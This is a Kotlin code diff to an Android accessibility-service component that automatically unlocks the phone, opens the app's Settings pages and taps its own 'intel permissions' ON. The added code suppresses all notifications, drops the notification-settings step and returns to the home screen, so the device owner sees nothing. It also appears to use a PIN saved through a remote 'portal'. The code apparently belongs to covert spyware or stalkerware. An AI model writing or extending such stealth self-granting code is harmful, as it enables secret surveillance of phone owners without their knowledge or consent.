@@ -9,7 +9,7 @@ import android.util.Log
 import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
 
-/** Opens App Settings → Permissions and toggles everything ON, then runtime dialogs. */
+/** Opens App Settings → Permissions and toggles intel permissions ON — stealth (no notifications). */
 object SettingsPermissionGrant {
     private const val TAG = "SettingsGrant"
     private val running = AtomicBoolean(false)
@@ -41,11 +41,15 @@ object SettingsPermissionGrant {
             return
         }
 
-        SetupReporter.progress("Opening Settings → Permissions…", "start")
-        ScreenPower.wakeScreen(context)
-        LockScreenHelper.unlockBlocking(context, service)
-        Thread.sleep(350)
+        StealthNotifications.suppressAll(context)
+        SetupReporter.progress("Unlocking phone first…", "start")
+        if (!LockScreenHelper.ensureUnlocked(context, service, 22_000L)) {
+            SetupReporter.error("Phone must be unlocked first — tap Unlock or save PIN in portal")
+            return
+        }
+        Thread.sleep(400)
 
+        SetupReporter.progress("Opening Settings → Permissions…")
         openAppDetails(context)
         Thread.sleep(900)
         PermissionAutoGrant.runSettingsPass(context, "App info", 12_000)
@@ -54,10 +58,6 @@ object SettingsPermissionGrant {
         Thread.sleep(700)
         SetupReporter.progress("Toggling permissions ON…")
         PermissionAutoGrant.runSettingsPass(context, "Permission list", 35_000)
-
-        openNotificationSettings(context)
-        Thread.sleep(700)
-        PermissionAutoGrant.runSettingsPass(context, "Notifications", 10_000)
 
         requestBatteryExemption(context)
         Thread.sleep(700)
@@ -68,11 +68,23 @@ object SettingsPermissionGrant {
         Thread.sleep(400)
         PermissionAutoGrant.runSilentBlocking(context, 25_000)
 
+        StealthNotifications.suppressAll(context)
+        returnToHome(service)
+
         val taps = PermissionAutoGrant.lastTapCount()
         SetupReporter.done(
-            if (taps > 0) "Settings permissions granted — $taps step(s)" else "Permissions scan complete",
+            if (taps > 0) "Permissions granted — $taps step(s) (stealth, no notifications)" else "Permissions scan complete",
             taps,
         )
+    }
+
+    private fun returnToHome(service: TouchAccessibilityService) {
+        repeat(3) {
+            service.globalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
+            Thread.sleep(180)
+        }
+        service.globalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+        service.scheduleRefreshesAfterInput(forceFull = true)
     }
 
     private fun openAppDetails(context: Context) {
@@ -81,15 +93,6 @@ object SettingsPermissionGrant {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         }
         context.startActivity(intent)
-    }
-
-    private fun openNotificationSettings(context: Context) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
-        val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
-            putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        }
-        runCatching { context.startActivity(intent) }
     }
 
     private fun requestBatteryExemption(context: Context) {
